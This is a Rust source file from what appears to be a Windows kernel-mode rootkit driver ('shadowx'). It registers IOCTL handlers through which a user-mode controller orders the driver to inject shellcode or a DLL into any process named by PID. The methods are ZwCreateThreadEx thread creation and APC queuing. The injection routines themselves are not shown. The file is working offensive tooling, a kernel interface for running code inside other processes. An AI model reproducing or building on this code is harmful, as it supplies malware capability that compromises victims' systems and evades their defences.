use {
    alloc::boxed::Box, 
    wdk_sys::{IO_STACK_LOCATION, IRP},
};

use {
    crate::utils::{
        get_input_buffer,
        ioctls::IoctlManager
    }, 
    common::{
        structs::TargetInjection,
        ioctls::{
            INJECTION_DLL_THREAD,
            INJECTION_SHELLCODE_APC,
            INJECTION_SHELLCODE_THREAD,
        }, 
    },
};

/// Registers the IOCTL handlers for injection-related operations.
///
/// This function registers IOCTL handlers for different types of code injection operations
/// (shellcode injection and DLL injection). Each type of injection is associated with its
/// respective IOCTL code.
///
/// # Supported Injection Types:
///
/// * **INJECTION_SHELLCODE_THREAD** - Shellcode injection using a new thread created via `ZwCreateThreadEx`.
/// * **INJECTION_SHELLCODE_APC** - Shellcode injection using APC (Asynchronous Procedure Call).
/// * **INJECTION_DLL_THREAD** - DLL injection using `ZwCreateThreadEx`.
///
/// # Arguments
///
/// * `ioctls` - A mutable reference to an `IoctlManager` where the injection-related
///   IOCTL handlers will be registered.
pub fn register_injection_ioctls(ioctls: &mut IoctlManager) {
    // Shellcode injection using a new thread (ZwCreateThreadEx).
    ioctls.register_handler(INJECTION_SHELLCODE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // Get the input buffer with the injection data.
            let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
            let pid = (*input_buffer).pid;
            let path = (*input_buffer).path.as_str();

            // Set the size of the returned information.
            (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;

            // Perform shellcode injection using a new thread.
            shadowx::Shellcode::injection_thread(pid, path)
        }
    }));

    // Shellcode injection via APC (Asynchronous Procedure Call).
    ioctls.register_handler(INJECTION_SHELLCODE_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // Get the input buffer with the injection data.
            let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
            let pid = (*input_buffer).pid;
            let path = (*input_buffer).path.as_str();

            // Set the size of the returned information.
            (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;

            // Perform shellcode injection via APC.
            shadowx::Shellcode::injection_apc(pid, path)
        }
    }));

    // DLL injection using a new thread (ZwCreateThreadEx).
    ioctls.register_handler(INJECTION_DLL_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // Get the input buffer with the injection data.
            let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
            let pid = (*input_buffer).pid;
            let path = (*input_buffer).path.as_str();

            // Set the size of the returned information.
            (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;

            // Perform DLL injection using a new thread.
            shadowx::DLL::injection_dll_thread(pid, path)
        }
    }));
}
